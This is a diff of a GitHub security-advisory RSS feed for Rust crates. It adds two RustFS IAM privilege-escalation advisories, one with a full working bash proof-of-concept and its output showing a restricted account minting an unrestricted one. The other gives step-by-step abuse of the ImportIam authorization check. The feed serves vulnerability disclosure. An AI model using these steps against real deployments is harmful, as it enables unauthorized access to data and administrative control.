@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-01-08T20:02:01.798Z</updated>
+    <updated>2026-01-08T21:01:57.807Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,278 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[rustfs] RustFS has IAM deny_only Short-Circuit that Allows Privilege Escalation via Service Account Minting]]></title>
+        <id>https://github.com/advisories/GHSA-xgr5-qc6w-vcg9</id>
+        <link href="https://github.com/advisories/GHSA-xgr5-qc6w-vcg9"/>
+        <updated>2026-01-08T20:40:06.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A flawed <code>deny_only</code> short-circuit in RustFS IAM allows a restricted service account or STS credential to self-issue an unrestricted service account, inheriting the parent’s full privileges. This enables privilege escalation and bypass of session/inline policy restrictions.</p>
+<h2 id="details">Details</h2>
+<p><strong>akin to MinIO CVE-2025-62506</strong></p>
+<ul>
+<li>Policy evaluation: <code>Policy::is_allowed</code> returns true when <code>deny_only=true</code> if no explicit Deny is hit, skipping all Allow checks (<code>crates/policy/src/policy/policy.rs:66-74</code>).</li>
+<li>Service account creation path sets <code>deny_only=true</code> when the target user equals the caller or its parent (<code>rustfs/src/admin/handlers/service_account.rs:114-127</code>).</li>
+<li>Service accounts are created without <code>session_policy</code> by default, so claims lack <code>SESSION_POLICY_NAME</code>; combined with <code>deny_only</code>, self-operations are allowed without Allow statements.</li>
+<li>Result: a limited service account/STS can create a new service account without policy and obtain the parent’s full rights (even root), bypassing original restrictions.</li>
+</ul>
+<p>Key code references:</p>
+<ul>
+<li><code>crates/policy/src/policy/policy.rs</code> (deny_only short-circuit)</li>
+<li><code>rustfs/src/admin/handlers/service_account.rs:</code> (deny_only set for self/parent target)</li>
+<li><code>crates/iam/src/sys.rs</code> (service account creation defaults, no session_policy)</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>Requires <code>awscli</code>, <code>awscurl</code>, <code>jq</code>, RustFS at <code>http://127.0.0.1:9000</code>, root AK/SK <code>rustfsadmin/rustfsadmin</code>. Run:</p>
+<pre><code class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+
+# ===================== Config =====================
+ENDPOINT="${ENDPOINT:-http://127.0.0.1:9000}"
+ROOT_AK="${ROOT_AK:-rustfsadmin}"
+ROOT_SK="${ROOT_SK:-rustfsadmin}"
+PARENT_AK="${PARENT_AK:-restricted}"
+PARENT_SK="${PARENT_SK:-restricted123}"
+CHILD_AK="${CHILD_AK:-evilchild}"
+CHILD_SK="${CHILD_SK:-evilchild123}"
+AWS_REGION="${AWS_REGION:-us-east-1}"
+
+# Tools
+AWSCURL_BIN="${AWSCURL_BIN:-$HOME/Library/Python/3.13/bin/awscurl}"
+AWS_BIN="${AWS_BIN:-aws}"
+JQ_BIN="${JQ_BIN:-jq}"
+
+# Disable proxies for local endpoint
+export HTTP_PROXY=
+export HTTPS_PROXY=
+export NO_PROXY=127.0.0.1,localhost
+
+# ===================== Helpers =====================
+aws_cmd() {
+  local ak="$1" sk="$2"
+  shift 2
+  AWS_ACCESS_KEY_ID="$ak" AWS_SECRET_ACCESS_KEY="$sk" "$AWS_BIN" --endpoint-url "$ENDPOINT" "$@"
+}
+
+awscurl_admin() {
+  local ak="$1" sk="$2"
+  shift 2
+  AWS_ACCESS_KEY_ID="$ak" AWS_SECRET_ACCESS_KEY="$sk" \
+    "$AWSCURL_BIN" --service s3 --region "$AWS_REGION" --access_key "$ak" --secret_key "$sk" "$@"
+}
+
+timestamp_iso() {
+  python - &lt;&lt;'PY'
+import datetime
+print((datetime.datetime.now(datetime.timezone.utc)+datetime.timedelta(hours=1)).isoformat())
+PY
+}
+
+# ===================== Cleanup =====================
+echo "[+] cleanup service accounts (ignore errors)"
+for ak in "$CHILD_AK" "$PARENT_AK"; do
+  awscurl_admin "$ROOT_AK" "$ROOT_SK" -X DELETE "$ENDPOINT/rustfs/admin/v3/delete-service-accounts?accessKey=$ak" &gt;/dev/null 2&gt;&amp;1 || true
+done
+
+echo "[+] cleanup buckets"
+for b in bucket1 bucket2 bucket3; do
+  aws_cmd "$ROOT_AK" "$ROOT_SK" s3 rb "s3://$b" --force &gt;/dev/null 2&gt;&amp;1 || true
+done
+
+# ===================== Setup =====================
+echo "[+] create buckets"
+for b in bucket1 bucket2 bucket3; do
+  aws_cmd "$ROOT_AK" "$ROOT_SK" s3 mb "s3://$b" || true
+done
+
+echo "[+] seed bucket3 with marker object"
+printf "poc-marker\n" | aws_cmd "$ROOT_AK" "$ROOT_SK" s3 cp - s3://bucket3/poc-marker.txt
+
+EXP="$(timestamp_iso)"
+
+echo "[+] create restricted policy"
+RESTRICTED_POLICY='{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": ["s3:ListBucket"],
+      "Resource": ["arn:aws:s3:::bucket1", "arn:aws:s3:::bucket2"]
+    },
+    {
+      "Effect": "Allow",
+      "Action": ["s3:GetObject", "s3:PutObject"],
+      "Resource": ["arn:aws:s3:::bucket1/*", "arn:aws:s3:::bucket2/*"]
+    }
+  ]
+}'
+
+echo "[+] create restricted service account"
+awscurl_admin "$ROOT_AK" "$ROOT_SK" -X PUT "$ENDPOINT/rustfs/admin/v3/add-service-accounts" \
+  -H 'Content-Type: application/json' \
+  -d "$("$JQ_BIN" -nc --arg ak "$PARENT_AK" --arg sk "$PARENT_SK" --arg policy "$RESTRICTED_POLICY" --arg exp "$EXP" \
+      '{accessKey:$ak, secretKey:$sk, policy:$policy, name:"restricted-sa", expiration:$exp}')" \
+  &gt; /tmp/restricted_sa.json
+cat /tmp/restricted_sa.json
+
+echo "[+] list buckets as restricted (expect bucket1,bucket2 only)"
+aws_cmd "$PARENT_AK" "$PARENT_SK" s3 ls
+
+echo "[+] create child service account without policy (trigger deny_only)"
+awscurl_admin "$PARENT_AK" "$PARENT_SK" -X PUT "$ENDPOINT/rustfs/admin/v3/add-service-accounts" \
+  -H 'Content-Type: application/json' \
+  -d "$("$JQ_BIN" -nc --arg ak "$CHILD_AK" --arg sk "$CHILD_SK" --arg exp "$EXP" \
+      '{accessKey:$ak, secretKey:$sk, name:"child-sa", expiration:$exp}')" \
+  &gt; /tmp/child_sa.json
+cat /tmp/child_sa.json
+
+echo "[+] child tries to list bucket3 (should be denied; success means vuln)"
+if aws_cmd "$CHILD_AK" "$CHILD_SK" s3 ls s3://bucket3; then
+  echo "child list bucket3: SUCCESS (vuln)"
+else
+  echo "child list bucket3: DENIED"
+fi
+
+echo "[+] child tries to read marker from bucket3"
+if aws_cmd "$CHILD_AK" "$CHILD_SK" s3 cp s3://bucket3/poc-marker.txt /tmp/poc-marker.txt; then
+  echo "child read marker: SUCCESS (vuln). Content:"
+  cat /tmp/poc-marker.txt
+else
+  echo "child read marker: DENIED"
+fi
+
+echo "[+] child tries to write new object into bucket3"
+if printf "child-write\n" | aws_cmd "$CHILD_AK" "$CHILD_SK" s3 cp - s3://bucket3/child-write.txt; then
+  echo "child write: SUCCESS (vuln)"
+else
+  echo "child write: DENIED"
+fi
+</code></pre>
+<p>PoC steps (in <code>poc.sh</code>):</p>
+<ol>
+<li>Cleanup old test accounts/buckets; create bucket1/2/3; seed bucket3 with <code>poc-marker.txt</code>.</li>
+<li>Create restricted policy (List/Get/Put only on bucket1/2).</li>
+<li>Create restricted service account <code>restricted/restricted123</code> with that policy.</li>
+<li>With <code>restricted</code>, create child service account <code>evilchild/evilchild123</code> <strong>without policy</strong> (deny_only short-circuit).</li>
+<li>With <code>evilchild</code>, list bucket3 and read/write objects (expected to be denied; success demonstrates vuln). Script prints SUCCESS/DENIED.</li>
+</ol>
+<p>Result:</p>
+<pre><code class="language-text">./poc.sh
+[+] cleanup service accounts (ignore errors)
+[+] cleanup buckets
+[+] create buckets
+make_bucket: bucket1
+make_bucket: bucket2
+make_bucket: bucket3
+[+] seed bucket3 with marker object
+[+] create restricted policy
+[+] create restricted service account
+{"credentials":{"accessKey":"restricted","secretKey":"restricted123","expiration":"2025-12-16T11:51:18.049076Z"}}
+[+] list buckets as restricted (expect bucket1,bucket2 only)
+2025-12-16 18:51:16 bucket1
+2025-12-16 18:51:16 bucket2
+[+] create child service account without policy (trigger deny_only)
+{"credentials":{"accessKey":"evilchild","secretKey":"evilchild123","expiration":"2025-12-16T11:51:18.049076Z"}}
+[+] child tries to list bucket3 (should be denied; success means vuln)
+2025-12-16 18:51:17         11 poc-marker.txt
+child list bucket3: SUCCESS (vuln)
+[+] child tries to read marker from bucket3
+download: s3://bucket3/poc-marker.txt to ../../../../../tmp/poc-marker.txt
+child read marker: SUCCESS (vuln). Content:
+poc-marker
+[+] child tries to write new object into bucket3
+child write: SUCCESS (vuln)
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Privilege escalation / authorization bypass. Any holder of a restricted service account or STS credential can mint an unrestricted service account and gain parent-level (up to root) access across S3/Admin/KMS operations. High risk to confidentiality and integrity.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rustfs/rustfs/security/advisories/GHSA-xgr5-qc6w-vcg9">https://github.com/rustfs/rustfs/security/advisories/GHSA-xgr5-qc6w-vcg9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22043">https://nvd.nist.gov/vuln/detail/CVE-2026-22043</a></li>
+<li><a href="https://github.com/advisories/GHSA-xgr5-qc6w-vcg9">https://github.com/advisories/GHSA-xgr5-qc6w-vcg9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xgr5-qc6w-vcg9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-01-08T20:40:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rustfs] RustFS has IAM Incorrect Authorization in ImportIam that Allows Privilege Escalation]]></title>
+        <id>https://github.com/advisories/GHSA-vcwh-pff9-64cc</id>
+        <link href="https://github.com/advisories/GHSA-vcwh-pff9-64cc"/>
+        <updated>2026-01-08T20:36:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>ImportIam</code> admin API validates permissions using <strong><code>ExportIAMAction</code></strong> instead of <strong><code>ImportIAMAction</code></strong>, allowing a principal with <em>export-only</em> IAM permissions to perform <em>import</em> operations. Since importing IAM data performs privileged <strong>write</strong> actions (creating/updating users, groups, policies, and service accounts), this can lead to <strong>unauthorized IAM modification and privilege escalation</strong>.</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>In <code>ImportIam</code>, the authorization check is implemented as follows:</p>
+<pre><code class="language-rust">validate_admin_request(
+    &amp;req.headers,
+    &amp;cred,
+    owner,
+    false,
+    vec![Action::AdminAction(AdminAction::ExportIAMAction)],
+).await?;
+</code></pre>
+<p>However, this code resides in the <strong>Import IAM</strong> operation (<code>struct ImportIam {}</code>), which performs <strong>state-changing IAM writes</strong>.</p>
+<p>The expected behavior is to validate against <strong><code>AdminAction::ImportIAMAction</code></strong> (or an equivalent import-specific admin action), not <code>ExportIAMAction</code>.</p>
+<hr>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites</strong></p>
+<ol>
+<li>A RustFS deployment with IAM enabled.</li>
+<li>An IAM user or role that has <strong>Export IAM</strong> permission but <strong>does not</strong> have Import IAM or full admin permissions.</li>
+<li>Access credentials for that user.</li>
+</ol>
+<p><strong>Steps</strong></p>
+<ol>
+<li><p>Create or obtain an IAM principal with permission equivalent to:</p>
+<pre><code>AdminAction::ExportIAMAction
+</code></pre>
+<p>and without Import IAM privileges.</p>
+</li>
+<li><p>Prepare a valid IAM import ZIP archive containing, for example:</p>
+<ul>
+<li>A new policy granting administrative permissions</li>
+<li>A user or service account bound to that policy</li>
+</ul>
+</li>
+<li><p>Send a request to the Import IAM endpoint (the same endpoint handled by <code>ImportIam::call</code>), authenticating with the export-only credentials.</p>
+</li>
+<li><p>Observe that:</p>
+<ul>
+<li>The request passes authorization.</li>
+<li>IAM entities from the archive are created or modified successfully.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Expected Result</strong></p>
+<ul>
+<li>The request should be rejected with an authorization error (e.g., AccessDenied).</li>
+</ul>
+<p><strong>Actual Result</strong></p>
+<ul>
+<li>The request succeeds, and IAM state is modified.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rustfs/rustfs/security/advisories/GHSA-vcwh-pff9-64cc">https://github.com/rustfs/rustfs/security/advisories/GHSA-vcwh-pff9-64cc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22042">https://nvd.nist.gov/vuln/detail/CVE-2026-22042</a></li>
+<li><a href="https://github.com/advisories/GHSA-vcwh-pff9-64cc">https://github.com/advisories/GHSA-vcwh-pff9-64cc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vcwh-pff9-64cc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-01-08T20:36:17.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[lru] `IterMut` violates Stacked Borrows by invalidating internal pointer]]></title>
         <id>https://github.com/advisories/GHSA-rhfx-m35p-ff5j</id>
@@ -1284,47 +1556,5 @@ passed incorrect arguments and produced wrong results. This corrupted SHA-3 dige
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-12-04T17:24:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[maxminddb] maxminddb's `Reader::open_mmap` unsoundly marks unsafe memmap operation as safe]]></title>
-        <id>https://github.com/advisories/GHSA-mj73-j457-8x9q</id>
-        <link href="https://github.com/advisories/GHSA-mj73-j457-8x9q"/>
-        <updated>2025-12-11T17:28:13.000Z</updated>
-        <content type="html"><![CDATA[<p>maxminddb prior to version 0.27 declared <code>Reader::open_mmap</code> as safe despite wrapping an inherently unsafe memmap2 operation with no extra step done to guarantee safety. This could have led to undefined behaviour if the file were to be modified on disk while the memory map was still active.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/oschwald/maxminddb-rust/issues/86">https://github.com/oschwald/maxminddb-rust/issues/86</a></li>
-<li><a href="https://github.com/oschwald/maxminddb-rust/commit/98f0e4fff9678c841ed33f3b8a46322f6163c32a">https://github.com/oschwald/maxminddb-rust/commit/98f0e4fff9678c841ed33f3b8a46322f6163c32a</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0132.html">https://rustsec.org/advisories/RUSTSEC-2025-0132.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-mj73-j457-8x9q">https://github.com/advisories/GHSA-mj73-j457-8x9q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mj73-j457-8x9q</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-12-02T00:29:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rtvm-interpreter]  rtvm-interpreter lacks sufficient checks in public API]]></title>
-        <id>https://github.com/advisories/GHSA-pq5v-rwp8-p7gm</id>
-        <link href="https://github.com/advisories/GHSA-pq5v-rwp8-p7gm"/>
-        <updated>2025-12-02T00:27:13.000Z</updated>
-        <content type="html"><![CDATA[<p>The affected function is unsound due to insufficient checks on public struct field.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0131.html">https://rustsec.org/advisories/RUSTSEC-2025-0131.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-pq5v-rwp8-p7gm">https://github.com/advisories/GHSA-pq5v-rwp8-p7gm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pq5v-rwp8-p7gm</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-12-02T00:27:10.000Z</published>
     </entry>
 </feed>
